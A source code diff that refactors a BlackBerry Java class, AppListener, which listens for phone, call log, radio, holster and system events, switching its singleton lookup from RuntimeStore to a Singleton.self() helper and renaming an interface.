@@ -22,7 +22,6 @@ import net.rim.device.api.memorycleaner.MemoryCleanerListener;
 import net.rim.device.api.system.DeviceInfo;
 import net.rim.device.api.system.HolsterListener;
 import net.rim.device.api.system.RadioStatusListener;
-import net.rim.device.api.system.RuntimeStore;
 import net.rim.device.api.system.SystemListener2;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
@@ -32,7 +31,7 @@ import blackberry.interfaces.ApplicationObserver;
 import blackberry.interfaces.BacklightObserver;
 import blackberry.interfaces.BatteryStatusObserver;
 import blackberry.interfaces.CallListObserver;
-import blackberry.interfaces.Singleton;
+import blackberry.interfaces.iSingleton;
 import blackberry.manager.ModuleManager;
 
 /**
@@ -47,7 +46,7 @@ import blackberry.manager.ModuleManager;
  */
 public final class AppListener extends Listener implements RadioStatusListener,
         HolsterListener, SystemListener2, PhoneListener,
-        PhoneLogListener, Singleton {
+        PhoneLogListener, iSingleton {
 
     private static final long GUID = 0x4e5dd52b9f50b3feL;
 
@@ -82,10 +81,10 @@ public final class AppListener extends Listener implements RadioStatusListener,
      */
     public synchronized static AppListener getInstance() {
         if (instance == null) {
-            instance = (AppListener) RuntimeStore.getRuntimeStore().get(GUID);
+            instance = (AppListener) Singleton.self().get(GUID);
             if (instance == null) {
                 final AppListener singleton = new AppListener();
-                RuntimeStore.getRuntimeStore().put(GUID, singleton);
+                Singleton.self().put(GUID, singleton);
                 instance = singleton;
             }
 
